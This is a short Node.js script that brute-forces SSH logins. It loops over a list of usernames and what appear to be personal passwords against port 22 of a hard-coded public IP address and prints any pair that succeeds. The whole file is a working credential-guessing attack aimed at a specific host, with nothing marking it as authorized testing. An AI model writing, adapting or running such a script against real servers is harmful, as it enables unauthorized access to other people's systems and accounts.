const { Client } = require('ssh2');

const host = '207.180.253.45';
const users = ['root', 'diego_2807_', 'admin', 'ubuntu'];
const passwords = ['Diego2807', '2NlsKt2Mw9?lhvau', 'DIEGO_blanco_2807'];

async function tryConnect(user, pass) {
    return new Promise((resolve) => {
        const conn = new Client();
        conn.on('ready', () => {
            console.log(`✅ EXITO: Usuario=${user}, Password=${pass}`);
            conn.end();
            resolve(true);
        }).on('error', () => {
            resolve(false);
        }).connect({
            host,
            port: 22,
            username: user,
            password: pass,
            readyTimeout: 5000
        });
    });
}

async function start() {
    console.log('🔍 Iniciando escaneo de credenciales...');
    for (const user of users) {
        for (const pass of passwords) {
            console.log(`Probando ${user}...`);
            const success = await tryConnect(user, pass);
            if (success) return;
        }
    }
    console.log('❌ Todas las combinaciones fallaron.');
}

start();
